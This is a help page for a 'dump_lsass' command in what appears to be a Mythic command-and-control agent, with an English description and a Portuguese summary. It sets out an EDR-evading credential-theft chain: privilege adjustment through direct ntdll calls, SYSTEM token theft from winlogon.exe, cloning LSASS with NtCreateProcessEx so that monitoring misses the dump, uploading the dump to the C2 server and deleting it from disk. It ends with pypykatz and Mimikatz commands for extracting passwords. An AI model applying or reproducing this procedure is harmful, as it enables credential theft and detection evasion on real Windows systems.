+++
title = "dump_lsass"
chapter = false
weight = 100
hidden = false
+++

## Summary

Dumps LSASS memory using a **process fork evasion technique**: instead of calling `MiniDumpWriteDump` directly on the live LSASS process, clones LSASS in memory via `NtCreateProcessEx` and dumps the clone with `ProcessId=0`. EDR hooks that filter on the real LSASS PID will not catch this dump.

- **Platform**: Windows only
- **Needs Admin**: Yes (SeDebugPrivilege required)
- **MITRE ATT&CK**: T1003.001 — OS Credential Dumping: LSASS Memory
- **Dependencies**: Pure ctypes (no external packages)
- **Version**: 1.0
- **Author**: @wtechsec

### Arguments

#### output_path *(optional)*
- Description: Output path for the dump file on disk. File is deleted after successful upload.
- Required: No
- Default: `%TEMP%\forked_lsass.dmp`

## Usage

```
dump_lsass
dump_lsass C:\Windows\Temp\custom.dmp
```

## Technique Detail

```
1. RtlAdjustPrivilege(SE_DEBUG=20)     ← direct ntdll call, bypasses advapi32 hooks
   └─ on failure (UAC filtered token) → SYSTEM token steal via winlogon.exe
        NtOpenProcess(winlogon) + DuplicateTokenEx + ImpersonateLoggedOnUser

2. NtOpenProcess(lsass_pid, PROCESS_ALL_ACCESS)  ← bypasses kernel32.OpenProcess hooks

3. NtCreateProcessEx(ParentProcess=lsass_handle)
   → forked_handle  ← in-memory clone, inherits full VAD, no real process PID

4. MiniDumpWriteDump(forked_handle, ProcessId=0, MiniDumpWithFullMemory)
   ← EDR sees dump of anonymous process, not lsass.exe PID

5. Dump uploaded to Mythic via chunked download protocol
6. Dump deleted from disk; RevertToSelf() cleans impersonation
```

## MITRE ATT&CK Mapping

- **T1003.001** — OS Credential Dumping: LSASS Memory

## Notes

- Requires elevated agent or user with SeDebugPrivilege in their full token.
- If `RtlAdjustPrivilege` fails (UAC split token), automatically attempts SYSTEM token impersonation from `winlogon.exe`, `services.exe`, or `wininit.exe`.
- Uses `NtOpenProcess` (ntdll direct) instead of `OpenProcess` (kernel32) to avoid userland hooks applied by EDR products.
- The dump file is removed from disk after successful upload to Mythic.
- Credential Guard / PPL-protected LSASS blocks this technique entirely.
- Parse the resulting dump offline with Mimikatz or pypykatz.

### Offline Analysis

```bash
# Linux / Kali
pypykatz lsa minidump forked_lsass.dmp

# Windows (Mimikatz)
sekurlsa::minidump forked_lsass.dmp
sekurlsa::logonpasswords
```

---

## Resumo em Português (PT-BR)

Realiza dump da memória do LSASS usando a técnica de **fork de processo**: em vez de chamar `MiniDumpWriteDump` diretamente no LSASS real, clona o processo via `NtCreateProcessEx` e faz o dump do clone (`ProcessId=0`). Bypassa hooks de EDR que filtram dumps pelo PID real do LSASS.

### Fluxo de execução
1. `RtlAdjustPrivilege(SE_DEBUG)` via ntdll direto — bypassa hooks advapi32 e token UAC filtrado
2. Fallback: roubo de token SYSTEM via `winlogon.exe` → `ImpersonateLoggedOnUser`
3. `NtOpenProcess(lsass)` via ntdll — bypassa hooks kernel32
4. `NtCreateProcessEx(ParentProcess=lsass)` → clone em memória sem PID real
5. `MiniDumpWriteDump(clone, ProcessId=0)` — EDR não identifica como dump do LSASS real
6. Upload para Mythic via protocolo chunked; arquivo removido do disco

### Análise offline
```bash
# Kali/Linux
pypykatz lsa minidump forked_lsass.dmp

# Windows
sekurlsa::minidump forked_lsass.dmp && sekurlsa::logonpasswords
```

### Requisitos
- Agente rodando como usuário elevado com token completo (não UAC filtrado)
- Credential Guard ou PPL ativo bloqueia a técnica
